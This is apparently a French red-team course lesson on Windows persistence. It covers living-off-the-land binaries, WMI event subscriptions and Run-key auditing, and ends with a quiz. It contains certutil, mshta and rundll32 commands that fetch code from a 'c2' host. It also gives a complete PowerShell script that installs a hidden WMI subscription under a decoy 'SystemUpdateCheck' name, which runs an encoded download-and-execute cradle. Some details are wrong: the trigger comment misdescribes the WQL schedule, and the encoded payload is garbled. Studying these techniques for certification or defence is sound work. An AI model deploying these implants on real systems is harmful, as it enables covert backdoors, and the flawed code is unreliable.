# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 297 (6h) : Advanced Persistence & Living off the Land (LOLBas / GTFOBins, WMI Event Subscriptions, Scheduled Tasks & Registry Auto-Runs)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques de **Persistance Avancée et d'exécution Furtive "Living off the Land" (LOLBas / GTFOBins)** ciblées par les certifications **CRTO** et **eCPPT** : maintenir un accès persistant sur un système Windows sans binaire malveillant via les **WMI Event Subscriptions**, les **Tâches Planifiées cachées**, les clés de registre **Auto-Run**, et exécuter du code à l'aide de binaires légitimes certifiés Microsoft (`certutil`, `mshta`, `rundll32`).
>
> **Compétences visées :** `PERSIST-01` (A) — Living off the Land (LOLBas / GTFOBins) | `PERSIST-02` (A) — WMI Event Subscription & Registry Persistence

---

## 1) Module — Concepts LOLBas (Living off the Land Binaries) (2h)

### 📖 Narration/Intuition

Les attaquants Red Team et les APTs modernes évitent d'importer leurs propres outils d'attaque (ex: pas de `nc.exe` ou `mimikatz.exe` sur le disque) pour échapper à la détection des EDRs. Ils réutilisent exclusivement des exécutables légitimes signés par Microsoft déjà présents sur le système cible : ce sont les **LOLBins (Living off the Land Binaries)** (catalogués par le projet LOLBAS pour Windows et GTFOBins pour Linux).

```
[ Attaquant ] ──(Télécharge & Exécute)──► certutil.exe -urlcache -f http://c2/s.exe s.exe
                                          mshta.exe http://c2/script.hta
                                          rundll32.exe javascript:"\..\mshtml..."
```

---

## 2) Module — Persistance WMI Event Subscription (`wmi_persistence.ps1`) (2h)

### 🛠️ Atelier Pratique

**Création d'une persistance furtive WMI en PowerShell (`wmi_persist.ps1`) :**

```powershell
# ═══════════════════════════════════════════════════════
# Persistance WMI Fileless (S'exécute automatiquement au démarrage du système)
# ═══════════════════════════════════════════════════════

# 1) WMI Event Filter : Déclenché 5 minutes après le boot du système
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 'SystemUpdateCheckFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 5"
}

# 2) WMI Event Consumer : Exécute notre payload PowerShell
$CommandLine = 'powershell.exe -NoP -NonI -W Hidden -Enc aQB4ACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjADIALgBjAG8AbQAvAHMALgBwAHMAMQAnACkA'

$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemUpdateCheckConsumer'
    CommandLineTemplate = $CommandLine
}

# 3) WMI Filter-To-Consumer Binding : Lie le filtre au consommateur
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $EventFilter
    Consumer = $EventConsumer
}

Write-Host "[+] Persistance WMI Event Subscription installée avec succès ! (Zéro binaire sur disque)"
```

---

## 3) Module — Script Python d'Inspection des Clés de Registre Auto-Run (`registry_persistence.py`) (2h)

```python
import winreg

# Script Python d'audit/installation de persistance par clés de registre Windows

REG_PATHS = [
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
]

def audit_registry_persistence():
    print("=== AUDIT DES CLÉS DE REGISTRE PERSISTANTES (RUN / RUNONCE) ===")
    for hkey, path in REG_PATHS:
        try:
            key = winreg.OpenKey(hkey, path, 0, winreg.KEY_READ)
            print(f"\n[*] Registre : {path}")
            i = 0
            while True:
                name, value, _ = winreg.EnumValue(key, i)
                print(f"  - [{name}] -> {value}")
                i += 1
        except OSError:
            pass

audit_registry_persistence()
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **LOLBAS** | Living Off The Land Binaries, Scripts and Libraries — Projet répertoriant les LOLBins Windows |
| **GTFOBins** | Projet équivalent à LOLBAS pour les binaires UNIX / Linux (ex: `find`, `vim`, `sudo`) |
| **WMI** | Windows Management Instrumentation — Infrastructure d'administration système Windows |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Que signifie le terme **LOLBAS / Living off the Land** dans le contexte des opérations Red Team ?
- A) Utiliser exclusivement des exécutables et scripts légitimes déjà préinstallés sur le système d'exploitation cible (ex: `certutil`, `wmic`, `powershell`) pour accomplir des actions d'attaque sans déposer de binaires malveillants répertoriés
- B) Vivre à la campagne
- C) Utiliser des outils open-source
- D) Développer du code C++

**Réponse : A**

**Q2 :** Pourquoi la technique de persistance par **WMI Event Subscription** est-elle considérée comme "fileless" et particulièrement stealth ?
- A) Parce que la configuration de déclenchement et le script à exécuter sont stockés sous forme de données dans le dépôt WMI (`C:\Windows\System32\wbem\Repository`), sans créer aucun fichier `.exe` ou `.ps1` sur le système de fichiers
- B) Parce qu'elle efface le registre
- C) Parce qu'elle nécessite du matériel Wi-Fi
- D) Parce qu'elle fonctionne sans droits administrateur

**Réponse : A**

**Q3 :** Quel binaire système légitime Windows, initialement conçu pour gérer les certificats, est très fréquemment détourné par les attaquants pour télécharger des fichiers depuis une URL distante (`-urlcache -f`) ?
- A) `certutil.exe`
- B) `notepad.exe`
- C) `calc.exe`
- D) `ping.exe`

**Réponse : A**

**Q4 :** Quel est le projet open-source équivalent à LOLBAS pour les systèmes d'exploitation Linux / Unix ?
- A) GTFOBins
- B) GitHub
- C) LinuxBas
- D) ShellBins

**Réponse : A**

**Q5 :** Quelle clé de registre Windows est l'emplacement historique le plus courant pour configurer la persistance d'une application au démarrage de la session utilisateur ?
- A) `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- B) `HKLM\SYSTEM\CurrentControlSet\Control`
- C) `HKCU\Environment`
- D) `HKLM\HARDWARE`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
